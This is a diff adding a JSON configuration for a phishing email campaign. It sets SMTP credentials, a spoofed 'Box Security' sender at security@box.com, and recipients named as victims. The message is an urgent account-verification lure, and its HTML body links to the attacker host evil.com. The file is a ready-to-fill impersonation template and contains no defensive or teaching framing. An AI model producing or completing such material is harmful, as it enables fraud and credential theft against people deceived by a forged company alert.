@@ -1,0 +1,12 @@
+{
+  "smtp_server": "your_smtp_server.com",
+  "smtp_port": 587,
+  "smtp_user": "your_email@example.com",
+  "smtp_pass": "your_password",
+  "sender_name": "Box Security",
+  "sender_email": "security@box.com",
+  "recipient_emails": ["victim1@example.com", "victim2@example.com"],
+  "subject": "Urgent Security Alert: Verify Your Account",
+  "body": "Dear User,\n\nWe have detected suspicious activity on your Box account. Please review the attached document immediately.\n\nSincerely,\nBox Security Team",
+  "html_content": "<html><body><h1>Click here for a surprise!</h1><a href='http://evil.com'>Click Me!</a></body></html>"
+}
